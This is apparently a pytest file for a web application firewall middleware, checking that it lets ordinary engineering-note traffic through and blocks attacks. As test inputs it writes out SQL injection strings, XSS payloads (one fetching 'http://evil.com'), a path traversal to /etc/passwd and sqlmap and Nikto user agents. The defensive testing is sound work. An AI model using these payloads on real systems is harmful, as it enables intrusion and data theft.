"""
Unit and Integration Tests for Samanvay Enterprise WAF & Zero-Trust Firewall Middleware.
"""

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from pydantic import BaseModel

from shared.security.firewall import FirewallConfig, FirewallMiddleware, SlidingWindowRateLimiter


class SamplePayload(BaseModel):
    text: str
    discipline: str = "civil"


def create_test_app(config: FirewallConfig) -> FastAPI:
    app = FastAPI(title="Firewall Secured Test App")
    app.add_middleware(FirewallMiddleware, config=config)

    @app.get("/health")
    def health():
        return {"status": "healthy"}

    @app.get("/api/search")
    def search(query: str = ""):
        return {"results": f"Found results for {query}"}

    @app.post("/api/submit")
    def submit(data: SamplePayload):
        return {"received": data.text, "discipline": data.discipline}

    return app


def test_firewall_allows_legitimate_traffic():
    config = FirewallConfig(enabled=True)
    app = create_test_app(config)
    client = TestClient(app)

    # Legitimate GET
    res = client.get("/health")
    assert res.status_code == 200
    assert res.json() == {"status": "healthy"}
    assert res.headers["X-Content-Type-Options"] == "nosniff"
    assert res.headers["X-Frame-Options"] == "DENY"
    assert res.headers["X-Firewall-Layer"] == "Samanvay-Enterprise-ZeroTrust"

    # Legitimate POST with construction engineering note
    res = client.post("/api/submit", json={"text": "Erected 12m piping spool on line 24-PL-001", "discipline": "piping"})
    assert res.status_code == 200
    assert res.json()["received"] == "Erected 12m piping spool on line 24-PL-001"


def test_firewall_blocks_sqli_in_query_params():
    config = FirewallConfig(enabled=True)
    app = create_test_app(config)
    client = TestClient(app)

    # SQL Injection in query string
    res = client.get("/api/search?query=UNION SELECT * FROM audit_log")
    assert res.status_code == 403
    data = res.json()
    assert data["error"] == "Security Violation"
    assert data["code"] == "WAF_INJECTION_DETECTED"


def test_firewall_blocks_sqli_in_json_body():
    config = FirewallConfig(enabled=True)
    app = create_test_app(config)
    client = TestClient(app)

    # SQL Injection in JSON body
    res = client.post("/api/submit", json={"text": "some text'; DROP TABLE audit_log; --", "discipline": "piping"})
    assert res.status_code == 403
    data = res.json()
    assert data["error"] == "Security Violation"
    assert data["code"] == "WAF_BODY_INJECTION_DETECTED"


def test_firewall_blocks_xss_attacks():
    config = FirewallConfig(enabled=True)
    app = create_test_app(config)
    client = TestClient(app)

    # Script tag XSS
    res = client.post("/api/submit", json={"text": "<script>alert('hacked')</script>", "discipline": "piping"})
    assert res.status_code == 403
    assert res.json()["code"] == "WAF_BODY_INJECTION_DETECTED"

    # Img onerror XSS
    res = client.post("/api/submit", json={"text": "normal note <img src=x onerror=fetch('http://evil.com')>", "discipline": "civil"})
    assert res.status_code == 403


def test_firewall_blocks_path_traversal():
    config = FirewallConfig(enabled=True)
    app = create_test_app(config)
    client = TestClient(app)

    res = client.get("/api/search?query=../../../../etc/passwd")
    assert res.status_code == 403
    assert res.json()["code"] == "WAF_INJECTION_DETECTED"


def test_firewall_blocks_malicious_user_agents():
    config = FirewallConfig(enabled=True)
    app = create_test_app(config)
    client = TestClient(app)

    # sqlmap tool user agent
    res = client.get("/api/search?query=test", headers={"user-agent": "sqlmap/1.5.2#stable (http://sqlmap.org)"})
    assert res.status_code == 403
    assert res.json()["code"] == "WAF_SCANNER_BLOCKED"

    # nikto vulnerability scanner
    res = client.get("/api/search?query=test", headers={"user-agent": "Mozilla/5.00 (Nikto/2.1.6)"})
    assert res.status_code == 403


def test_firewall_rate_limiting():
    # Strict rate limit of 5 requests per minute, no whitelist for test IP
    config = FirewallConfig(enabled=True, rate_limit_per_minute=5, ip_whitelist=set())
    app = create_test_app(config)
    client = TestClient(app)

    # First 5 should succeed
    for _ in range(5):
        res = client.get("/api/search?query=hello", headers={"CF-Connecting-IP": "203.0.113.42"})
        assert res.status_code == 200

    # 6th request must be rate-limited (HTTP 429)
    res = client.get("/api/search?query=hello", headers={"CF-Connecting-IP": "203.0.113.42"})
    assert res.status_code == 429
    assert res.json()["code"] == "WAF_RATE_LIMITED"
    assert "Retry-After" in res.headers


def test_firewall_zero_trust_gateway_token():
    # Require gateway token
    config = FirewallConfig(
        enabled=True,
        require_gateway_token=True,
        gateway_token_secret="samanvay-top-secret-token-2026",
    )
    app = create_test_app(config)
    client = TestClient(app)

    # 1. Health check is exempt and works without token
    res = client.get("/health")
    assert res.status_code == 200

    # 2. Accessing API without token is blocked with 403
    res = client.get("/api/search?query=piping")
    assert res.status_code == 403
    assert res.json()["code"] == "ZERO_TRUST_GATEWAY_TOKEN_REQUIRED"

    # 3. Accessing API with invalid token is blocked
    res = client.get("/api/search?query=piping", headers={"X-Internal-Gateway-Token": "wrong-token"})
    assert res.status_code == 403

    # 4. Accessing API with valid secret token succeeds
    res = client.get("/api/search?query=piping", headers={"X-Internal-Gateway-Token": "samanvay-top-secret-token-2026"})
    assert res.status_code == 200


def test_sliding_window_rate_limiter():
    limiter = SlidingWindowRateLimiter(limit_per_minute=3, burst_limit=10)
    ip = "198.51.100.1"

    allowed1, rem1 = limiter.is_allowed(ip)
    assert allowed1 is True
    assert rem1 == 2

    allowed2, rem2 = limiter.is_allowed(ip)
    assert allowed2 is True
    assert rem2 == 1

    allowed3, rem3 = limiter.is_allowed(ip)
    assert allowed3 is True
    assert rem3 == 0

    allowed4, rem4 = limiter.is_allowed(ip)
    assert allowed4 is False
    assert rem4 == 0
